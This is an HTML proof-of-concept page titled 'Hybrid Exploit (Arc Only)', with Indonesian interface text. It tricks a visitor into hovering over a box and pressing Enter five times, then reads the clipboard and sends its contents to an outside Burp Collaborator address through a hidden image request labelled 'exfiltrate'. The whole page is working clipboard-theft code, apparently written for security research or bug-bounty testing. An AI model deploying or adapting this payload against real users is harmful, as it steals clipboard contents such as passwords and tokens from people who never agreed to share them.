<!DOCTYPE html>
<html>
<head>
  <title>Hybrid Exploit (Arc Only)</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    #hoverBox {
      display: inline-block;
      padding: 30px 60px;
      background: #eee;
      border: 2px dashed #999;
      font-size: 18px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>

  <h2>Arahkan kursor ke kotak lalu tekan ENTER 5x</h2>
  <div id="hoverBox">‚ñ∂ Hover di sini</div>
  <div id="msg">Menunggu interaksi...</div>
  <div id="result"></div>

  <script>
    let hovered = false;
    let count = 0;
    let triggered = false;

    document.getElementById("hoverBox").addEventListener("mouseover", () => {
      hovered = true;
      document.getElementById("msg").innerText = "Kursor terdeteksi. Tekan ENTER 5x...";
    });

    document.body.addEventListener("keydown", (e) => {
      if (hovered && e.key === "Enter" && !triggered) {
        count++;
        document.getElementById("msg").innerText = `ENTER ditekan (${count}/5)...`;

        if (count >= 5) {
          triggered = true;
          document.getElementById("msg").innerText = "üìã Membaca clipboard...";

          navigator.clipboard.readText().then(text => {
            document.getElementById("result").innerText = "üìã Clipboard:\n" + text;

            // exfiltrate
            const img = new Image();
            img.src = "https://your-collab.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
          }).catch(err => {
            document.getElementById("msg").innerText = "‚ùå Gagal: " + err;
          });
        }
      }
    });
  </script>

</body>
</html>
